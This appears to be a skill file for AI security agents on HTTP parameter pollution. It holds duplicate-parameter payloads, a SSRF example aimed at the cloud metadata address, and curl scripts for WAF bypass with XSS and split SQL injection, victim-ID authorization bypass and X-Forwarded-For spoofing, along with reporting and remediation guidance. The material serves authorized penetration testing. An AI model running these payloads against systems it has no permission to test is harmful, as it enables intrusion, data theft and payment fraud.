---
name: http-parameter-pollution
description: >-
  HTTP Parameter Pollution (HPP): duplicate query/body keys parsed differently by servers, proxies, WAFs, and app frameworks. Use when filters and application layers disagree on which value wins, enabling bypass, SSRF second URL, logic abuse, or CSRF token confusion.
---

# SKILL: HTTP Parameter Pollution (HPP)

> **AI LOAD INSTRUCTION**: Model the **full request path**: browser → CDN/WAF → reverse proxy → app framework → business code. Duplicate keys (`a=1&a=2`) are not an error at HTTP level; each hop may pick first, last, join, or array-ify. Test HPP when WAF and app disagree, or when internal HTTP clients rebuild query strings. Routing note: when the same parameter appears multiple times, or WAF/backend stacks differ, use the Section 1 matrix to test first/last/merge assumptions, then design Section 3 scenario chains.

## 0. QUICK START

**Hypothesis**: the **security check** reads one occurrence of a parameter while the **action** reads another.

### First-pass payloads

```text
id=1&id=2
id=1&id=1%20OR%201=1
url=https://legit.example&id=https://evil.example
amount=1&amount=9999
csrf=TOKEN_A&csrf=TOKEN_B
user=alice&user=admin
```

### Body variants (repeat for POST)

```text
application/x-www-form-urlencoded
id=1&id=2

multipart/form-data
------boundary
Content-Disposition: form-data; name="id"
1
------boundary
Content-Disposition: form-data; name="id"
2
```

### Quick methodology

1. Fingerprint **front** stack (CDN/WAF) vs **origin** (language/framework) using baseline `a=1&a=2`.
2. Send **both** orders: `a=1&a=2` and `a=2&a=1` (some parsers are order-sensitive).
3. If JSON: test **duplicate keys** and Content-Type confusion (see Section 2).

---

## 1. SERVER BEHAVIOR MATRIX

Typical defaults — **always confirm**; middleware and custom parsers override these.

| Technology | Behavior | Example: `a=1&a=2` |
|---|---|---|
| PHP / Apache (`$_GET`) | Last occurrence | `a=2` |
| ASP.NET / IIS | Often comma-joined (all) | `a=1,2` |
| JSP / Tomcat (servlet param) | First occurrence | `a=1` |
| Python / Django (`QueryDict`) | Last occurrence | `a=2` |
| Python / Flask (`request.args`) | First occurrence | `a=1` |
| Node.js / Express (`req.query`) | Array of values | `a=['1','2']` (shape may vary by parser version) |
| Perl / CGI | First occurrence | `a=1` |
| Ruby / Rack (Rack::Utils) | Last occurrence | `a=2` |
| Go `net/http` (`ParseQuery`) | First occurrence | `a=1` |

**Why it matters**: a WAF on **IIS** might see `1,2` while PHP backend receives `2` only — or the reverse if a proxy normalizes.

---

## 2. PAYLOAD PATTERNS

### 2.1 Basic duplicate key

```http
GET /api?q=safe&q=evil HTTP/1.1
```

### 2.2 Array-style (PHP / some frameworks)

```http
GET /api?id[]=1&id[]=2 HTTP/1.1
```

### 2.3 Mixed array + scalar

```http
GET /api?item[]=a&item=b HTTP/1.1
```

### 2.4 Encoded ampersand (parser differential)

```text
# Literal & inside a value vs new pair — depends on decoder
param=value1%26other=value2
param=value1&other=value2
```

### 2.5 Nested / bracket keys

```http
GET /api?user[name]=a&user[role]=user&user[role]=admin HTTP/1.1
```

### 2.6 JSON duplicate keys

```json
{"test":"user","test":"admin"}
```

Many parsers keep **last** key; some keep **first**. JavaScript `JSON.parse` keeps the last duplicate key.

---

## 3. ATTACK SCENARIOS

### 3.1 HPP + WAF bypass

**Pattern**: WAF inspects **first** value; application uses **last**.

```text
id=1&id=1%20UNION%20SELECT%20...
```

Also try: benign value in JSON field duplicated in query string, if gateway merges sources differently.

### 3.2 HPP + SSRF

**Pattern**: validator reads **safe** URL; fetcher reads **internal/evil** URL.

```text
url=https://allowed.cdn.example/&url=http://169.254.169.254/
```

Confirm which component (library vs app) consumes which occurrence.

### 3.3 HPP + CSRF

**Pattern**: duplicate anti-CSRF token so one copy satisfies parser A and another satisfies parser B.

```text
csrf=LEGIT&csrf=IGNORED_OR_ALT
```

Use only in **authorized** CSRF assessments with a clear state-changing target.

### 3.4 HPP + business logic (e.g. payment)

```text
amount=1&amount=5000
quantity=1&quantity=-1
price=9.99&price=0.01
```

Pair with **race conditions** or **server-side rounding** for higher impact; HPP alone often needs a split interpretation across layers.

---

## 4. TOOLS

| Tool | How to use |
|---|---|
| **Burp Suite** | Repeater: duplicate keys in raw query/body; Param Miner / extensions for hidden params; compare responses for `first` vs `last` interpretation |
| **OWASP ZAP** | Manual Request Editor; Automated Scan may not deeply fuzz HPP — prefer manual variants |
| **Custom scripts** | Build exact raw HTTP (preserve ordering) — some clients normalize duplicates |

**Tip**: log **raw** query strings at the app if you control a test lab; some frameworks expose only the “winning” value while logs show the full string.

---

## 5. DECISION TREE

```text
                    +-------------------------+
                    | Duplicate param name    |
                    | same request            |
                    +------------+------------+
                                 |
              +------------------+------------------+
              |                                     |
       +------v------+                       +------v------+
       | Single app  |                       | WAF / CDN / |
       | layer only  |                       | proxy chain |
       +------+------+                       +------+------+
              |                                     |
    +---------v---------+                 +---------v---------+
    | Read framework    |                 | Map each hop:     |
    | docs + test       |                 | first/last/join/  |
    | a=1&a=2 vs swap   |                 | array             |
    +---------+---------+                 +---------+---------+
              |                                     |
              +------------------+------------------+
                                 |
                          +------v------+
                          | Pick attack |
                          | template    |
                          +------+------+
                                 |
         +-----------+-----------+-----------+-----------+
         |           |           |           |           |
    +----v----+ +----v----+ +----v----+ +----v----+ +----v----+
    | WAF vs  | | SSRF    | | CSRF    | | Logic   | | JSON    |
    | app     | | split   | | token   | | numeric | | dup key |
    | value   | | URL     | | confuse | | fields  | | parsers |
    +---------+ +---------+ +---------+ +---------+ +---------+
```

---

**Safety & scope**: HPP testing can change server state (payments, account settings). Run only where **explicitly authorized**, with scoped accounts, and document parser behavior before high-impact requests.

---

## 6. EXECUTION PRIMITIVES

HPP is proven by **the server acting on a value you did not expect it to act on** - a WAF that misses
the payload a backend still applies, a parameter that reaches a query with attacker-chosen content, or
an authorization decision made on one copy while the action uses another.

### 6.1 Map what the application does with duplicates

```bash
# send the same parameter twice and see which copy wins, per platform
for Q in "a=first&a=second" "a=first&a=second&a=third" "a[]=first&a[]=second" \
         "a=first;b=x&a=second" ; do
  echo "=== $Q"
  curl -sS "https://target.tld/api/echo?$Q" | head -c 200; echo
done
```

The observable outcomes are: **first wins**, **last wins**, **both are concatenated** (`first,second`),
or **an array is returned**. Each platform has a default (PHP takes the last, ASP.NET and many Java
frameworks concatenate, Node's `querystring` returns an array), and the behaviour decides which of the
following attacks is possible. **Record the matrix** - you cannot choose a payload without it.

### 6.2 Find a WAF/backend disagreement - the classic HPP bypass

```bash
# the WAF inspects one copy; the backend uses another. Prove the backend saw your payload.
P='<script>alert(1)</script>'
# naive duplicates: WAF may only check the first
curl -sS -o /tmp/h1 -w 'dup-first  %{http_code}\n' "https://target.tld/search?q=benign&q=$P"
grep -c 'alert(1)' /tmp/h1
# a benign value in the copy the WAF reads, the payload in the one the app uses
curl -sS -o /tmp/h2 -w 'dup-last   %{http_code}\n' "https://target.tld/search?q=$P&q=benign"
grep -c 'alert(1)' /tmp/h2
# array syntax against frameworks that flatten
curl -sS -o /tmp/h3 -w 'array      %{http_code}\n' "https://target.tld/search?q[]=$P&q[]=benign"
grep -c 'alert(1)' /tmp/h3
# encoded separator variants
curl -sS -o /tmp/h4 -w 'encoded    %{http_code}\n' "https://target.tld/search?q=benign%26q=$P"
head -c 120 /tmp/h4; echo
```

**The proof is the backend acting on the payload while the WAF passed the request** - grep the
response for the payload taking effect (reflection in an executable context, an error from the
database, a changed value), not merely for the payload's presence.

### 6.3 SQL injection through HPP when a WAF is present

```bash
# split the injection across two parameters so no single value matches a filter regex
curl -sS -o /tmp/s1 -w '%{http_code}\n' "https://target.tld/item?id=1&id=1+UNION+SELECT+1,2,3--"
grep -icE 'error in your sql|syntax|union' /tmp/s1
curl -sS -o /tmp/s2 -w '%{http_code}\n' "https://target.tld/item?id=1/**/UNION&id=/**/SELECT&id=1,2,3"
grep -icE 'error in your sql|syntax' /tmp/s2
# and the ORDER BY / comment separated form
curl -sS -o /tmp/s3 -w '%{http_code}\n' "https://target.tld/item?id=1&id=1'/*&id=*/ORDER&id=BY&id=5--"
head -c 200 /tmp/s3
```

A **backend error or a row-count difference** is the evidence. If the WAF returns its own block page,
the split failed; try a different separator or parameter name. Coordinate with the SQL injection
domain for the content of the fragments - the deliverable here is the bypass, not the injection.

### 6.4 Parameter pollution as an authorization bypass

```bash
# the guard reads the first value; the action uses the last (or the reverse)
curl -sS -o /tmp/a1 -w 'guard-first %{http_code}\n' -b "session=$TOK" \
  "https://target.tld/api/user?id=MYID&id=VICTIMID"
grep -c 'VICTIMID\|victim@example' /tmp/a1
curl -sS -o /tmp/a2 -w 'guard-last  %{http_code}\n' -b "session=$TOK" \
  "https://target.tld/api/user?id=VICTIMID&id=MYID"
grep -c 'VICTIMID\|victim@example' /tmp/a2
```

If any ordering returns the victim's data while the request was authorized as you, **that is a full
authorization bypass**, and it is a much more serious finding than reflected-input HPP. Test both
orderings and both the URL and the body; frameworks often parse them differently.

### 6.5 Body and query duplication

```bash
# the WAF reads the query string, the backend reads the body (or the reverse)
curl -sS -o /tmp/b1 -w '%{http_code}\n' -X POST "https://target.tld/api/do?role=user" \
  -H 'Content-Type: application/x-www-form-urlencoded' -d 'role=admin'
head -c 200 /tmp/b1; echo
# JSON body with a duplicate query parameter of the same name
curl -sS -o /tmp/b2 -w '%{http_code}\n' -X POST "https://target.tld/api/do?role=user" \
  -H 'Content-Type: application/json' -d '{"role":"admin"}'
head -c 200 /tmp/b2; echo
# and duplicate keys inside a JSON object (parser-dependent: last usually wins)
curl -sS -o /tmp/b3 -w '%{http_code}\n' -X POST "https://target.tld/api/do" \
  -H 'Content-Type: application/json' -d '{"role":"user","role":"admin"}'
head -c 200 /tmp/b3
```

Duplicate JSON keys are a distinct and often overlooked pollution vector - several parsers silently
take the last value, and a WAF scanning raw text may not normalise them at all. **Compare the response
to the two single-value controls** to prove which one won.

### 6.6 HTTP header pollution

```bash
# repeated headers where one is trusted and one is used
curl -sS -o /tmp/hd1 -w '%{http_code}\n' "https://target.tld/" \
  -H "X-Forwarded-For: 10.0.0.1" -H "X-Forwarded-For: 127.0.0.1"
grep -c '127.0.0.1' /tmp/hd1
# comma-joined form, which some parsers split and others do not
curl -sS -o /tmp/hd2 -w '%{http_code}\n' "https://target.tld/admin" -H "X-Forwarded-For: 1.2.3.4, 127.0.0.1"
grep -icE 'denied|forbidden' /tmp/hd2
```

Repeated `X-Forwarded-For` headers with an internal address are the highest-value variant: the
access-control layer may read one copy while the application reads another. **A change in the
authorization outcome between the two forms is the finding.**

### 6.7 Use a proxy to control ordering precisely

```bash
# raw requests let you control exact repetition, order, and encoding - tools that normalise will hide it
curl -sS -o /tmp/raw1 "https://target.tld/api/echo?a=1&a=2&a=3"
curl -sS -o /tmp/raw2 "https://target.tld/api/echo?a=1%26a=2%26a=3"
curl -sS -o /tmp/raw3 "https://target.tld/api/echo?a=1&a=2" -X POST -d 'a=3'
echo "--- single";   head -c 120 /tmp/raw1
echo "--- encoded"; head -c 120 /tmp/raw2
echo "--- mixed";   head -c 120 /tmp/raw3
```

Encoded separators (`%26`), semicolons (`;` as a separator in some frameworks), and mixed
query-plus-body are the three forms that most often produce a parser disagreement. **Semicolon
handling changed in several servers after their security advisories** - test it rather than assuming.

### 6.8 Confirm the disagreement is real and not an echo

```bash
# a control: send only the benign value and only the payload, and record what the app does
curl -sS "https://target.tld/search?q=benign" -o /tmp/c1 -w 'control-benign %{http_code} %{size_download}\n'
curl -sS "https://target.tld/search?q=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("<script>alert(1)</script>"))')" -o /tmp/c2 -w 'control-payload %{http_code} %{size_download}\n'
curl -sS "https://target.tld/search?q=benign&q=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("<script>alert(1)</script>"))')" -o /tmp/c3 -w 'polluted %{http_code} %{size_download}\n'
cmp -s /tmp/c2 /tmp/c3 && echo "polluted == payload control : no bypass" || echo "polluted differs : inspect why"
```

If the polluted response is **identical to the payload-only response**, the backend used the payload -
and the interesting question is whether the payload-only response would have been blocked. Run that
blocked request first, **then** the polluted one, so the bypass is demonstrable as a before/after.

---

## 7. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Does the application **behave differently** with a duplicate parameter than with either single value? | pollution is occurring at all |
| 2 | Does the WAF **block the payload when sent alone**? | the baseline the bypass must beat |
| 3 | Does the **backend act on the payload** when it is polluted, with the WAF passing it? | the bypass - the core finding |
| 4 | Which **copy wins** (first, last, concatenated, array), and on which parser? | the mechanism, and what the fix must cover |
| 5 | Is the effect an **authorization change**, a **filter bypass**, or a **data change**? | determines severity and audience |
| 6 | Is the parameter reachable by an **unauthenticated or low-privilege user**? | severity |
| 7 | Is the polluted value reaching a **sink** (SQL, response, access decision) or only being stored? | a stored duplicate is not yet a finding |

**The bypass needs the blocked control.** Reporting "duplicate parameters change behaviour" without
proving the single-value payload was blocked is a parser curiosity, not a security bypass.

---

## 8. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **blocked control** - the payload sent alone, with the WAF response recorded | the thing being bypassed |
| The **polluted request** that reached the backend, with the full parameter order | the bypass, reproducible byte-for-byte |
| The **response proving the backend acted** on the payload, not merely echoed it | the effect |
| The **platform and parser behaviour** observed, with the test that established it | first-wins versus last-wins changes the payload and the fix |
| The **endpoint and parameter** with the affected role | the fix location |
| For an **authorization** bypass: the requested identity versus the returned identity | the strongest form of the finding |
| **Negative control** - the benign single-value request returns the expected result | shows the difference is caused by pollution |
| The **WAF and backend identification**, where possible | the disagreement is between two named components |
| A statement of **which sink** the polluted value reached | framework in the report |
| Confirmation that no data was **modified** unless the finding is a write | scope discipline |

Report the **before/after pair**: "`GET /search?q=<script>alert(1)</script>` is blocked by the edge WAF
with `403` and a block page; `GET /search?q=benign&q=<script>alert(1)</script>` returns `200` and the
payload is reflected unescaped in the results page, identical to the payload-only response captured
after temporarily disabling the filter; the backend is PHP, which uses the last duplicate, while the WAF
inspects the first", never "the application is vulnerable to HTTP parameter pollution".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| Duplicate parameters produce a different response, with no blocked control | a parser difference, not a bypass |
| The payload appears in the response but is escaped or inert | no effect |
| The WAF also blocks the polluted request | the filter normalised correctly |
| A payload sent alone was never blocked in the first place | there is nothing to bypass |
| A payload reflected into an HTML-escaped sink | not exploitable |
| A duplicate-parameter 500 | an error is not a bypass |
| The app returns an array because it documents that behaviour | by design |
| Pollution you can only observe with a proxy that rewrites the request into an invalid form | not deliverable |
| A "bypass" achieved by disabling the WAF for the test | invalid test |
| An authorization difference caused by a second valid session you hold | not pollution |
| A parameter the backend ignores entirely | no sink |
| Duplicate headers that the server deduplicates before any logic runs | no disagreement |

**Prove the control was blocked first.** Without the blocked baseline, every HPP observation is a
parser detail.

---

## 9. REMEDIATION REFERENCE

1. **Reject duplicate parameters explicitly, rather than resolving them by a parser default** - the application should return `400` for a repeated parameter it expects once, which removes the entire class and makes the behaviour independent of the framework.
2. **Normalise at the edge, once** - the WAF, the reverse proxy, and the application must all see the same parsed parameters; a normalising proxy that rejects repeats eliminates the disagreement.
3. **Use explicit parameter names and a strict schema** - a request that must contain exactly one `role` should be validated as such, and unknown or repeated keys should be dropped before any logic runs.
4. **Never derive authorization from a parameter** - identifiers, roles, and tenant values must come from the session or a server-side lookup, which makes a polluted parameter irrelevant to the decision.
5. **Parse the body and the query string with one authority, and reject conflicts between them** - a parameter present in both with different values should be an error, not a silent precedence rule.
6. **Normalise duplicate JSON keys before validation** - reject objects with repeated keys outright, because parsers disagree and a WAF scanning text will not see the second copy.
7. **Do not rely on repeated headers for trust decisions** - take the client address from the connection, or from a single header set by a trusted proxy that strips inbound copies of it.
8. **Test the WAF against polluted requests as part of its configuration review** - a WAF that does not normalise repeated parameters is misconfigured for the application behind it, and that is a finding in its own right.
9. **Log the raw request when a duplicate parameter is detected** - if you cannot reject repeats, detect and alert on them, because legitimate clients almost never send them.
10. **Pin and document the framework's parameter-resolution behaviour** - a framework upgrade can silently change first-wins to last-wins, and that change can turn a benign duplicate into an authorization bypass.
11. **Add a regression test for the specific pair you found** - assert the polluted request is rejected or normalised, so the fix cannot be undone by a proxy configuration change.

---

## 10. RELATED SIBLINGS - LOAD TOGETHER

- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) - the broader bypass family this belongs to
- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) - the sink a split payload usually targets
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) - the authorization bypass variant
- [request-smuggling](../request-smuggling/SKILL.md) - the other parser-disagreement class at the HTTP layer
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) - the sink for a reflected bypass
